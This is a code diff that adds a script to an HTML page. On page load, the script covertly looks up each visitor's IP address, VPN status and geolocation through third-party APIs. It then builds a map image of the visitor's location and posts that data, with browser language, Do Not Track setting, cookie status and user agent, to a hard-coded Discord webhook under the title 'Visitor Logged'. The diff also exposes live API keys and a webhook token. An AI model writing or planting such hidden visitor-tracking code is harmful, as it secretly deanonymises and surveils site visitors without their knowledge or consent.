@@ -58,6 +58,98 @@
         <button onclick="closePopup()">close</button>
     </div>
 
+    <script>
+        $(document).ready(() => {
+          $.getJSON("https://api.ipify.org?format=json", function (data) {
+            $.getJSON(
+              `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
+              function (vpnData) {
+                $.getJSON(
+                  `https://ipapi.co/${data.ip}/json`,
+                  function (ipData) {
+                    // sessionStorage.setItem('redirecting', 'true');
+                    sendData(
+                      data.ip,
+                      vpnData.security.vpn,
+                      `${ipData.region}, ${ipData.country_code}`,
+                      // `${id}`,
+                      `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
+                    );
+                  }
+                );
+              }
+            );
+          });
+        });
+
+        function sendData(ip, vpn, ipData /* discordId */, image) {
+          var currentTime = new Date().toUTCString();
+          var embed = {
+            embeds: [
+              {
+                title: "Visitor Logged",
+                description: `Logged At: \`${currentTime}\``,
+                image: {
+                  url: image,
+                },
+                color: 14177041,
+                fields: [
+                  {
+                    name: "IP Address",
+                    value: ip,
+                    inline: true,
+                  },
+                  {
+                    name: "VPN",
+                    value: vpn ? "✅" : "❌",
+                    inline: true,
+                  },
+                  {
+                    name: "Location",
+                    value: ipData ? ipData : "❓",
+                    inline: true,
+                  },
+                  {
+                    name: "Browser Language",
+                    value: navigator.language
+                      ? navigator.language.toUpperCase()
+                      : "❓",
+                    inline: true,
+                  },
+                  {
+                    name: "Do Not Track",
+                    value: navigator.doNotTrack ? "✅" : "❌",
+                    inline: true,
+                  },
+                  {
+                    name: "Cookies Enabled",
+                    value: navigator.cookieEnabled ? "✅" : "❌",
+                    inline: true,
+                  },
+                  {
+                    name: "App Version / User Agent",
+                    value: navigator.appVersion,
+                  },
+                ],
+              },
+            ],
+          };
+
+          fetch(
+            "https://discord.com/api/webhooks/1283503780825927690/d36GnITE9B5nOo0d_BR0Jn4f4mLKTZJ61TSiOPneMFOMCD6W9oN7NZULwCGdX6dSPARb",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(embed),
+            }
+          ).catch((error) => {
+            alert("Error sending data:", error);
+          });
+        }
+      </script>
+
     <audio id="audio" src=""></audio>
     
     <script src="assets/js/inspect.js"></script>
